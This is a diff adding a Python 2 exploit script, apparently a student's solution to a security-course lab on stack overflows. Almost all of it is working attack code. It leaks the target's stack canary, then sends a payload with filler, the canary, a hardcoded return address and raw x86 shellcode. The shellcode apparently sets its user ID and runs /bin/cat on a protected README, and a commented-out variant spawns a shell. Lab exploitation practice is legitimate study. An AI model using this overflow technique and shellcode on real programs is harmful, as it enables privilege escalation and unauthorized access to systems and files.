@@ -1,0 +1,72 @@
+#!/usr/bin/env python2
+
+from scaffold import *
+
+### YOUR CODE STARTS HERE ###
+import tempfile, subprocess
+def py3in2(func_text, arg):
+    # escape char in arg should be escaped twice. 
+    payload = ['#/usr/bin/env python3', 'def _func(arg):']
+    for line in func_text.split('\n'):
+        payload.append('    ' + line)
+    payload.append('with open("/dev/fd/1", "w") as f:\n    f.write(_func(\''+arg+'\'))\n')
+    payload = '\n'.join(payload)
+
+    with tempfile.NamedTemporaryFile() as tf:
+        tf.file.write(payload)
+        tf.file.close()
+        output = subprocess.check_output(["python3", tf.name], stderr=subprocess.PIPE)
+        return output
+
+def fuck_raddr(txt, rev=True):
+    def fuck8(txt):
+        assert(len(txt) == 8)
+        return txt[6:8] + txt[4:6] + txt[2:4] + txt[0:2]
+    
+    def revert(txt):
+        assert(len(txt) % 8 == 0)
+        res = ""
+        for i in range(int(len(txt) / 8)):
+            res += fuck8(txt[i*8:(i+1)*8])
+        return res
+
+    import binascii
+    if rev:
+        txt = revert(txt)
+    b = binascii.unhexlify(txt)
+    return b
+
+############# real code begin
+payload1 = '0123456789ab\\x' + '\n'
+p.send(payload1)
+reply1 = p.recvline()
+reply_canary = reply1[13:17]
+
+fill1 = "1"*16
+canary = reply_canary
+fill2 = "\0"*8
+retaddr = fuck_raddr("bffffaf4") # "bffffaf4"
+#payload = fuck_raddr("6a3158cd8089c389c16a4658cd8031c050682f2f6c73682f62696e545b505389e131d2b00bcd800a", False) # SHELLCODE
+payload = fuck_raddr("6a3158cd8089c389c16a4658cd8031c050682f636174682f62696e545b506841444d45682f2f524568652f6a7a682f686f6d545950515389e131d2b00bcd80", False) # SHELLCODE
+#payload = SHELLCODE
+
+msg = fill1 + canary + fill2 + retaddr + payload + '\n'
+#print(msg)
+p.send(msg)
+print(p.recvline())
+print(p.recvline())
+print(p.recvline())
+print(p.recvline())
+print(p.recvline())
+
+# HINT: the last line of your exploit should look something like:
+#   p.send('A' * m + canary + 'B' * n + rip + SHELLCODE + '\n')
+# where m, canary, n and rip are all values you must determine
+
+### YOUR CODE  ENDS  HERE ###
+
+returncode = p.end()
+
+if returncode == -11: print 'segmentation fault or stack canary!'
+elif returncode != 0: print 'return code', returncode
+
